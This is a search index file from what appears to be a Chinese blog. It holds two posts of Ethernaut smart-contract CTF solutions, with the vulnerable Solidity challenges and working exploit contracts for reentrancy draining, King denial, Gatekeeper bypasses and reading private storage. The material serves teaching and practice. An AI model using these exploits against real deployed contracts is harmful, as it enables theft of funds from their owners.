@@ -1,0 +1,45 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search> 
+  
+  
+    
+    <entry>
+      <title>Ethernaut题解——摘录(下)</title>
+      <link href="/2022/12/10/Ethernaut%E9%A2%98%E8%A7%A3%E2%80%94%E2%80%94%E6%91%98%E5%BD%95(%E4%B8%8B)/"/>
+      <url>/2022/12/10/Ethernaut%E9%A2%98%E8%A7%A3%E2%80%94%E2%80%94%E6%91%98%E5%BD%95(%E4%B8%8B)/</url>
+      
+        <content type="html"><![CDATA[<h2 id="Ethernaut题解——摘录-下"><a href="#Ethernaut题解——摘录-下" class="headerlink" title="Ethernaut题解——摘录(下)"></a>Ethernaut题解——摘录(下)</h2><h1 id="Preservation"><a href="#Preservation" class="headerlink" title="Preservation"></a>Preservation</h1><pre class=" language-l"><code class="language-l">pragma solidity ^0.8.0;contract Preservation {  // public library contracts   address public timeZone1Library;  address public timeZone2Library;  address public owner;   uint storedTime;  // Sets the function signature for delegatecall  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {    timeZone1Library = _timeZone1LibraryAddress;     timeZone2Library = _timeZone2LibraryAddress;     owner = msg.sender;  }   // set the time for timezone 1  function setFirstTime(uint _timeStamp) public {    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));  }  // set the time for timezone 2  function setSecondTime(uint _timeStamp) public {    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));  }}// Simple library contract to set the timecontract LibraryContract {  // stores a timestamp   uint storedTime;    function setTime(uint _time) public {    storedTime = _time;  }}</code></pre>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 智能合约安全 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Ethernaut题解——摘录（上）</title>
+      <link href="/2022/12/10/Ethernaut%E9%A2%98%E8%A7%A3%E2%80%94%E2%80%94%E6%91%98%E5%BD%95(%E4%B8%8A)/"/>
+      <url>/2022/12/10/Ethernaut%E9%A2%98%E8%A7%A3%E2%80%94%E2%80%94%E6%91%98%E5%BD%95(%E4%B8%8A)/</url>
+      
+        <content type="html"><![CDATA[<h1 id="Ethernaut题解摘录"><a href="#Ethernaut题解摘录" class="headerlink" title="Ethernaut题解摘录"></a>Ethernaut题解摘录</h1><h2 id="vault"><a href="#vault" class="headerlink" title="vault"></a>vault</h2><pre class=" language-l"><code class="language-l">pragma solidity ^0.8.0;contract Vault {  bool public locked;  bytes32 private password;  constructor(bytes32 _password) {    locked = true;    password = _password;  }  function unlock(bytes32 _password) public {    if (password == _password) {      locked = false;    }  }}</code></pre><p>要 unlock 这个合约账户，也就是要找到 password。虽然 password 被设为了 private，但是以太坊部署和合约上所有的数据都是可读的，包括这里合约内定义为private类型的password变量。，所以只要 getStorageAt 就可以了。</p><pre class=" language-l"><code class="language-l">await web3.eth.getStorageAt(instance, 1)// 0 为 locked 的位置，1 为 password</code></pre><h2 id="king"><a href="#king" class="headerlink" title="king"></a>king</h2><pre class=" language-l"><code class="language-l">pragma solidity ^0.8.0;contract King {  address king;  uint public prize;  address public owner;  constructor() payable {    owner = msg.sender;      king = msg.sender;    prize = msg.value;  }  receive() external payable {    require(msg.value >= prize || msg.sender == owner);    payable(king).transfer(msg.value);    king = msg.sender;    prize = msg.value;  }  function _king() public view returns (address) {    return king;  }}</code></pre><p>很明显可以通过看到receive函数中只要我们满足require的条件，就可以篡改合约的king。而题目说明中告知，当我们submit instance 时本关会尝试回收“王权”，也就是它会传入一个更大的msg.value，修改king为原来的msg.sender，为了阻止这一点，我们可以通过在合约的receive或者fallback函数中加入revert函数来实现。</p><pre class=" language-l"><code class="language-l">pragma solidity ^0.8.0;contract Exploit {    constructor(address challenge) public payable {        challenge.call.gas(10000000).value(msg.value)("");    }    fallback() external {        revert();    }}</code></pre><h2 id="Re-entrancy"><a href="#Re-entrancy" class="headerlink" title="Re-entrancy"></a>Re-entrancy</h2><pre class=" language-l"><code class="language-l">pragma solidity ^0.6.12;import 'openzeppelin-contracts-06/math/SafeMath.sol';contract Reentrance {    using SafeMath for uint256;  mapping(address => uint) public balances;  function donate(address _to) public payable {    balances[_to] = balances[_to].add(msg.value);  }  function balanceOf(address _who) public view returns (uint balance) {    return balances[_who];  }  function withdraw(uint _amount) public {    if(balances[msg.sender] >= _amount) {      (bool result,) = msg.sender.call{value:_amount}("");      if(result) {        _amount;      }      balances[msg.sender] -= _amount;    }  }  receive() external payable {}}</code></pre><p>经典的重入漏洞。<br>原因是call函数它没有gas的限制。</p><pre class=" language-l"><code class="language-l">pragma solidity ^0.8.0;contract attack {    address payable target;    address payable public owner;    uint amount = 1000000000000000 wei;    constructor(address payable _addr) public payable {        target=_addr;        owner = msg.sender;    }    function step1() public payable{        bool b;        (b,)=target.call{value: amount}(abi.encodeWithSignature("donate(address)",address(this)));        require(b,"step1 error");    }    function setp2() public payable {        bool b;        (b,)=target.call(abi.encodeWithSignature("withdraw(uint256)",amount));        require(b,"step2 error");    }    fallback () external payable{        bool b;        (b,)=target.call(abi.encodeWithSignature("withdraw(uint256)",amount));        require(b,"fallback error");    }    function mywithdraw() external payable{        require(msg.sender==owner,'not you');        msg.sender.transfer(address(this).balance);    }}</code></pre><h2 id="Gatekeeper-One"><a href="#Gatekeeper-One" class="headerlink" title="Gatekeeper One"></a>Gatekeeper One</h2><pre class=" language-l"><code class="language-l">pragma solidity ^0.8.0;contract GatekeeperOne {  address public entrant;  modifier gateOne() {    require(msg.sender != tx.origin);    _;  }  modifier gateTwo() {    require(gasleft() % 8191 == 0);    _;  }  modifier gateThree(bytes8 _gateKey) {      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)),"");      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "");      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "");    _;  }  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {    entrant = tx.origin;    return true;  }}</code></pre><p>msg.sender != tx.origin：即通过一个合约来间接调用 enter。<br>gasleft() % 8191 == 0：运行到这一步时剩余的 gas 要是 8191 的倍数。<br>输入的 _gateKey 满足三个条件。<br>第一个好办，直接写一个合约绕过就好。<br>第二个我是直接是爆破x，因为gas消耗总归是有个范围的，我们只需要在这个范围内爆破即可。</p><pre class=" language-l"><code class="language-l">function exploit() public {        bytes8 key=0xAAAAAAAA00004261;        bool result;        for (uint256 i = 0; i < 120; i++) {            (bool result, bytes memory data) = address(                target            ).call{gas:i + 150 + 8191 * 3}(abi.encodeWithSignature("enter(bytes8)",key));            if (result) {                break;            }        }</code></pre><p>第三个是一个简单的类型转换。<br><a href="https://www.tutorialspoint.com/solidity/solidity_conversions.htm#:~:text=Solidity%20compiler%20allows%20implicit%20conversion,value%20not%20allowed%20in%20uint256">https://www.tutorialspoint.com/solidity/solidity_conversions.htm#:~:text=Solidity%20compiler%20allows%20implicit%20conversion,value%20not%20allowed%20in%20uint256</a>.</p><h2 id="Gatekeeper-Two"><a href="#Gatekeeper-Two" class="headerlink" title="Gatekeeper Two"></a>Gatekeeper Two</h2><pre class=" language-l"><code class="language-l">pragma solidity ^0.8.0;contract GatekeeperTwo {  address public entrant;  modifier gateOne() {    require(msg.sender != tx.origin);    _;  }  modifier gateTwo() {    uint x;    assembly { x := extcodesize(caller()) }    require(x == 0);    _;  }  modifier gateThree(bytes8 _gateKey) {    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender))))     ^ uint64(_gateKey) == type(uint64).max);    _;  }  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {    entrant = tx.origin;    return true;  }}</code></pre><p>第一个同样通过合约绕过解决。<br>第二个，其中caller()函数返回call sender，也就是call的发起者，而extcodesize则是返回对应地址的合约代码的大小。如果extcodesize的参数是用户地址则会返回0，是合约地址则返回了调用合约的代码大小。关于这点，需要使用一个特性绕过：当合约正在执行构造函数constructor并部署时，其extcodesize为0。<br>所以攻击代码要写在 constructor 里。<br>第三个，这是一个简单的异或。<br>例子：如果A^B=C;那B^C=A；</p><pre class=" language-l"><code class="language-l">pragma solidity ^0.8.0;contract Exploit {    GatekeeperTwo challenge;    constructor(address addr) public {        challenge = GatekeeperTwo(addr);        uint64 key = uint64(bytes8(keccak256(abi.encodePacked(this))))         ^ uint64(0xFFFFFFFFFFFFFFFF);        challenge.enter(bytes8(key));    }}</code></pre>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 智能合约安全 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+  
+  
+</search>
